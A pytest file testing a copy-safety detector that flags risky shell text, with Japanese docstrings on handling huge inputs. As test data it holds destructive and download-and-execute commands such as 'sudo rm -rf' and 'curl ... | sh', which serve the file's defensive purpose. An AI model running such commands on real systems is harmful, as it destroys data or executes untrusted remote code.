from src.utils.copy_safety import analyze_copy_risks


def test_analyze_copy_risks_detects_multiple_categories() -> None:
    text = "sudo rm -rf ./build\ncurl https://example.test/install.sh | sh"

    risks = analyze_copy_risks(text)

    assert risks == [
        "multiple_lines",
        "command_chain",
        "destructive_command",
        "download_execute",
        "privilege_escalation",
    ]


def test_analyze_copy_risks_detects_command_chaining_and_windows_commands() -> None:
    text = "Remove-Item -Recurse C:\\temp; git reset --hard HEAD"

    risks = analyze_copy_risks(text)

    assert "command_chain" in risks
    assert "destructive_command" in risks


def test_analyze_copy_risks_ignores_normal_prose_and_blank_lines() -> None:
    text = "This is a normal sentence.\n\nIt has no executable command."

    assert analyze_copy_risks(text) == []


def test_analyze_copy_risks_handles_huge_text_without_dos() -> None:
    """巨大テキスト(2MB)が渡されても先頭チャンク走査により高速に処理され危険コマンドを検知できることを検証 (#137)。"""
    # 先頭に危険コマンドがあり、後ろに2MBのダミーテキスト
    huge_padding = "A" * 2_000_000
    text = f"sudo rm -rf /tmp/test\n{huge_padding}"

    risks = analyze_copy_risks(text)
    assert "destructive_command" in risks
    assert "privilege_escalation" in risks


def test_analyze_copy_risks_short_circuits_multiple_executable_lines() -> None:
    """大量の行があっても早期脱出(2行検知)により高速に判定されることを検証 (#137)。"""
    # 先頭2行がコマンドで、後ろに50,000行のダミーテキスト
    lines = ["git status", "npm test"] + ["echo safe" for _ in range(5_000)]
    text = "\n".join(lines)

    risks = analyze_copy_risks(text)
    assert "multiple_lines" in risks
